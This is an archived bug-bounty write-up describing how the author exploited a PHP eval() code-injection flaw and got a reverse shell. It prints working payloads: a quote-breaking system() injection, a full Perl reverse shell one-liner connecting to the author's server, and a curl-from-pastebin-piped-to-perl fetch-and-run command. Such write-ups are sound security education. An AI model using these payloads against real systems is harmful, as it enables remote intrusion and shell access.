---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-09-02_rce-by-code-injection-perl-reverse-shell.md
original_filename: 2021-09-02_rce-by-code-injection-perl-reverse-shell.md
title: RCE By Code Injection | Perl Reverse Shell
category: documents
detected_topics:
- command-injection
- ssrf
- xss
- path-traversal
- api-security
- supply-chain
tags:
- imported
- documents
- command-injection
- ssrf
- xss
- path-traversal
- api-security
- supply-chain
language: en
raw_sha256: a8572f59df3012f4d6471b02e891032f43bf8b639b6c24ee73cb16556d26fca5
text_sha256: ebc5fbfa52ee2a22c10670e4d60cf371345d6df910ef48a2f19d087413b44a01
ingested_at: '2026-06-28T07:32:07Z'
sensitivity: unknown
redactions_applied: true
---

# RCE By Code Injection | Perl Reverse Shell

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-09-02_rce-by-code-injection-perl-reverse-shell.md
- Source Type: markdown
- Detected Topics: command-injection, ssrf, xss, path-traversal, api-security, supply-chain
- Ingested At: 2026-06-28T07:32:07Z
- Redactions Applied: True
- Raw SHA256: `a8572f59df3012f4d6471b02e891032f43bf8b639b6c24ee73cb16556d26fca5`
- Text SHA256: `ebc5fbfa52ee2a22c10670e4d60cf371345d6df910ef48a2f19d087413b44a01`


## Content

---
title: "RCE By Code Injection | Perl Reverse Shell"
page_title: "Bugbounty PHP Code Injection Trick to Bypass Remote Code | Medium"
url: "https://4bdoz.medium.com/rce-by-code-injection-perl-reverse-shell-a2e90181b10"
authors: ["Abdulrahman-Kamel"]
bugs: ["RCE", "Code injection"]
publication_date: "2021-09-02"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 3353
scraped_via: "browseros"
---

# RCE By Code Injection | Perl Reverse Shell

RCE By Code Injection | Perl Reverse Shell
Abdulrahman-Kamel
Follow
3 min read
·
Sep 2, 2021

137

1

what is php code injection weakness ?

Code injection is an attack that delivers a malicious code payload through a vulnerable attack vector in eval() function without any sanitization or block dangerous functions like exec(), shell_exec(), system() or passthru()

Background story

W
hile hunting on a private program I like to search on custom parameters in burpsuite after finishing test , like ssrf , lfi , xss parameters and custom by me , you can see this repo GF-Patterns to many parameters
I have found interested parameter name [ local ] in post request , I am trying to test ssrf and lfi but failed
Trying inject PHP code because subdomain uses PHP backend, so.. lets hack :)

Injected payload

print("AbdulrahmanKamel0xx")
Press enter or click to view image in full size
no reflacted string

Using [ ; ] to skip the previous function but failed [X]

;print("AbdulrahmanKamel0xx") 

Using single qoute [‘] to close statement and [.] to concatenate => ‘..’

‘.print("AbdulrahmanKamel0xx").’
Press enter or click to view image in full size
Press enter or click to view image in full size
BOOM!

Injected Code Success ^_^

Press enter or click to view image in full size
Remote Code Execution
The expected backend code:
<?php
$input = $_REQUEST['local'];
eval('$input');
?>

If parameter value reflects inside double quotes will execute but inside single quotes cannot execute so we used single quote to close the statement and dot sign to concatenate

'.system("command").'
================================
<?php
$input = $_REQUEST['local'];
eval(''.$input.'');
?>
Getting Reverse Shell

I am listening on 1234 port on vps and trying to get reverse shell ..
Trying by bash script and many other ways but failed [X] :(
Trying to check netcat or socat in server ? but not installed [X]

'.system("nc -v").'
Press enter or click to view image in full size
not reflected any data mean not performing the command

Trying checks many languages like python , ruby and many of tools which can get reverse shell , not found but when check Perl language

Press enter or click to view image in full size
found Perl v5.20
Press enter or click to view image in full size
funny meme ^_^

we can get reverse shell by this code

perl -e 'use Socket;$i="<my-vps-ip>";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
Press enter or click to view image in full size
request syntax error because [&] sign

Failed operation because sign [&] means end the parameter and start new parameter like username=admin&password=***REDACTED***
I am trying to encode this sign but not work ..
I am trying to check curl tool installed or no ? by this query

'.system("curl -v").'

It was found. good, lets bypass this operation

Get Abdulrahman-Kamel’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

I am uploading Perl code on pastebin website after remove perl -e and [‘] quote ..

use Socket;$i="<my-vps-ip>";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};

Using curl to access this code and execute by pipe signal

curl https://pastebin.com/raw/EEaH**** | perl
...
'.system("curl https://pastebin.com/raw/EEaH**** | perl").'
Press enter or click to view image in full size
Reverse Shell via Perl

BOOM !! , it’s worked and get a reverse shell

Prevent PHP code injection

- Replace or Ban arguments with & ; && |
- Avoid using exec(), shell_exec(), system() or passthru()
- Avoid using strip_tags() for sanitisation
- Use a PHP security linter
- Utilise a SAST tool to identify code injection issues
- Do not trust any data from user

Stay in touch

Linkedin | Github | Twitter | Facebook
